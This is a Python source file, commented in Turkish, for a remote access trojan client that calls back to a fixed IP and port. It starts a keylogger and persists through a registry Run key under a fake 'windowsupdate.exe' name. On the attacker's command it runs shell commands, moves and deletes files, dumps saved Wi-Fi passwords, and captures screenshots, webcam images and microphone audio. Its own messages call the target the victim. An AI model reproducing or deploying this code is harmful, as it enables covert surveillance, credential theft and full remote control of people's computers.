import subprocess
import os
import simplejson
import base64
import socket
import kg
import time
import threading
import pyttsx3
from PIL import ImageGrab
import sys
import shutil
import cv2
import sound_record

ip = "192.168.1.105" # Bu değerleri kendinize göre değiştirin.
port = 4444 # Bu değerleri kendinize göre değiştirin.

my_thread = threading.Thread(target=kg.kg_Start)
my_thread.start()
class Soket_baglanti():
    def __init__(self,ip,port):
        self.baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.baglanti.connect((ip, port))
        self.kg_dosyasi = os.environ["appdata"] + "\\windowslogs.txt"
        self.tro_dosyasi = os.environ["appdata"] + "\\windowsupdate.exe"
        self.ss_dosyasi = os.environ["appdata"] + "\\update.png"
        self.kamera_dosyasi = os.environ["appdata"] + "\\windowsupdate.png"
        self.ses_dosyasi = os.environ["appdata"] + "\\windowssounds.wav"
        self.Mikrofon_Sorusu()

    def Mikrofon_Sorusu(self):
        sorunun_cevabi = self.Json_Al()
        if sorunun_cevabi == "E" or sorunun_cevabi == "e":
            my_thread2 = threading.Thread(target=self.Ses_Kayit_Basla)
            my_thread2.start()
            self.Json_Gonder("[+]Kurbanin mikrofonu kaydedilmeye başlandı.")
        elif sorunun_cevabi == "H" or sorunun_cevabi == "h":
            self.Json_Gonder("[+]Kurbanin mikrofonu kaydedilmeyecek.")

    def Komut_Calistir(self, komut):
        komut_cikisi = subprocess.check_output(komut, shell=True)
        return komut_cikisi.decode("Latin1")


    def Json_Gonder(self, bilgi):
        json_bilgi = simplejson.dumps(bilgi)
        self.baglanti.send(json_bilgi.encode("utf-8"))


    def Json_Al(self):
        json_bilgisi = ""
        while True:
            try:
                json_bilgisi = json_bilgisi + self.baglanti.recv(1048576).decode()
                return simplejson.loads(json_bilgisi)
            except ValueError:
                continue


    def Dosya_Icerigi_Al(self, yol):
        with open(yol, "rb") as dosya:
            return base64.b64encode(dosya.read())


    def Dosya_Kaydet(self, yol, icerik):
        with open(yol, "wb") as dosya:
            dosya.write(base64.b64decode(icerik))
            return "[+]Dosya karsi cihaza yuklendi."


    def Cd_Calistir(self, yol):
        os.chdir(yol)
        return "[+]Klasore gecildi :" + yol

    def Klasor_Olustur(self, dosya_adi):
        os.mkdir(dosya_adi)
        return "[+]Klasor olusturuldu :" + dosya_adi

    def Klasor_Sil(self, dosya_adi):
        os.rmdir(dosya_adi)
        return "[+]Klasor silindi :" + dosya_adi

    def Dosya_Sil(self, klasor_adi):
        os.remove(klasor_adi)
        return "[+]Silindi :" + klasor_adi

    def Isim_Degistir(self, ad1, ad2):
        os.rename(ad1, ad2)
        return "[+]Isim degistirildi.\n" + ad1 + "→→→→→→" + ad2

    def Dosya_Ac(self, dosya_adi):
        os.system(dosya_adi)
        return "[+]Dosya karsi bilgisayarda acildi :" + dosya_adi

    def Pwd(self):
        return os.getcwd()
    def Sistem(self):
        if os.name == 'nt':
            return "Kurban cihaz bir windows sürümü."
        elif os.name == 'posix':
            return "Kurban cihaz bir linux sürümü."

    def KG_Baslatici(self):
        kg.kg_Start()

    def Kg_Oku(self):
        with open(self.kg_dosyasi, "r",encoding="utf-8") as dosya:
            return dosya.read()

    def Konus(self, kelimeler):
        engine = pyttsx3.init()
        engine.setProperty("rate", 120)
        engine.say(kelimeler)
        engine.runAndWait()
        return "[+]Kurban cihazda ses calindi."

    def Kaliclik(self):
        if os.path.exists(self.tro_dosyasi):
            return "[+]Kalicilik zaten aktif."
        if not os.path.exists(self.tro_dosyasi):
            shutil.copyfile(sys.executable, self.tro_dosyasi)
            regedit_komutu = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /t REG_SZ /d " + self.tro_dosyasi
            subprocess.call(regedit_komutu,shell=True)
            return "[+]Kalicilik aktifleştirildi."
    def Kalicilik_Kaldir(self):
        if os.path.exists(self.tro_dosyasi):
            regedit_komutu = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /f"
            subprocess.call(regedit_komutu,shell=True)
            os.remove(self.tro_dosyasi)
            return "[+]Zararlı yazılımımız appdata klasöründe kaldırıldı ve kurban bilgisayarını her açtığında çalışmayacak."
        else:
            return "[+]Kalicilik bulunamadi."
    def Ses_Kayit_Basla(self):
        self.ses_kayit_basla = sound_record.Recording()
        self.ses_kayit_basla.Start_Record()


    def Soket_Basla(self):
        while True:
            komut = self.Json_Al()
            try:
                if komut[0] == "cd" and len(komut) > 1:
                    komut_cikisi = self.Cd_Calistir(komut[1])
                elif komut[0] == "indir":
                    komut_cikisi = self.Dosya_Icerigi_Al(komut[1])
                elif komut[0] == "yukle":
                    komut_cikisi = self.Dosya_Kaydet(komut[1], komut[2])
                elif komut[0] == "klasor_olustur":
                    komut_cikisi = self.Klasor_Olustur(komut[1])
                elif komut[0] == "klasor_sil":
                    komut_cikisi = self.Klasor_Sil(komut[1])
                elif komut[0] == "sil":
                    komut_cikisi = self.Dosya_Sil(komut[1])
                elif komut[0] == "yeniden_adlandir":
                    komut_cikisi = self.Isim_Degistir(komut[1], komut[2])
                elif komut[0] == "ac":
                    komut_cikisi = self.Dosya_Ac(komut[1])
                elif komut[0] == "pwd":
                    komut_cikisi = self.Pwd()
                elif komut[0] == "sistem":
                    komut_cikisi = self.Sistem()
                elif komut[0] == "kg_oku":
                    komut_cikisi = self.Kg_Oku()
                elif komut[0] == "konus":
                    komut_cikisi = self.Konus(komut[1:])
                elif komut[0] == "wifileri_goster":
                    wifiler = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode()
                    wifi = wifiler.split("\n")
                    profiller = [i.split(":")[1][1:-1] for i in wifi if "All User Profile" in i]
                    profil_str = " ".join(profiller)
                    komut_cikisi = "Wifi aglari : \n\n\n"
                    komut_cikisi +=profil_str + "\n\n\n"
                    komut_cikisi += "Wifi sifreleri(sirasiyla) :\n\n"
                    for i in profiller:
                        try:
                            sonuc = subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"]).decode("utf-8").split("\n")
                            sonuc = [b.split(":")[1][1:-1] for b in sonuc if "Key Content" in b]
                            sonuc_str = " ".join(sonuc)
                            if sonuc_str == "":
                                sonuc_str = "Sifresiz"

                            komut_cikisi += "\t" + sonuc_str
                        except subprocess.CalledProcessError:
                            print("Hata.")

                elif komut[0] == "ekran_goruntusu":
                    ImageGrab.grab().save(self.ss_dosyasi)
                    komut_cikisi=self.Dosya_Icerigi_Al(self.ss_dosyasi)
                    os.remove(self.ss_dosyasi)
                elif komut[0] == "kg_kaydet":
                    komut_cikisi = self.Dosya_Icerigi_Al(self.kg_dosyasi)
                    os.remove(self.kg_dosyasi)
                elif komut[0] == "kalicilik":
                    komut_cikisi = self.Kaliclik()
                elif komut[0] == "kalicilik_kaldir" :
                    komut_cikisi = self.Kalicilik_Kaldir()
                elif komut[0] == "kamera_goruntusu_al":
                    kamera = cv2.VideoCapture(0)
                    sonuc, goruntu = kamera.read()
                    if sonuc:
                        cv2.imwrite(self.kamera_dosyasi,goruntu)
                        komut_cikisi = self.Dosya_Icerigi_Al(self.kamera_dosyasi)
                        os.remove(self.kamera_dosyasi)
                    else:
                        komut_cikisi = "[-]Kameraya erisilemiyor."

                elif komut[0] == "ses_kayit_indir":
                    self.ses_kayit_basla.Stop_Record()
                    komut_cikisi = self.Dosya_Icerigi_Al(self.ses_dosyasi)
                    os.remove(self.ses_dosyasi)

                else:
                    komut_cikisi = self.Komut_Calistir(komut)
            except Exception:
                komut_cikisi = "Bilinmeyen bir komut.Komut listesi icin 'yardim' komutunu kullaniniz."

            self.Json_Gonder(komut_cikisi)
        self.baglanti.close()

def Baglanti_Dene():
    while True:
        time.sleep(5)
        try:
            soket = Soket_baglanti(ip, port)
            soket.Soket_Basla()
        except Exception:
            Baglanti_Dene()
def Kaliclik():
    tro_dosyasi = os.environ["appdata"] + "\\windowsupdate.exe"
    regedit_komut = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /t REG_SZ /d " + tro_dosyasi
    if not os.path.exists(tro_dosyasi):
        shutil.copyfile(sys.executable,tro_dosyasi)
        subprocess.call(regedit_komut,shell=True)
    if os.path.exists(tro_dosyasi):
        pass
Kaliclik()
Baglanti_Dene()
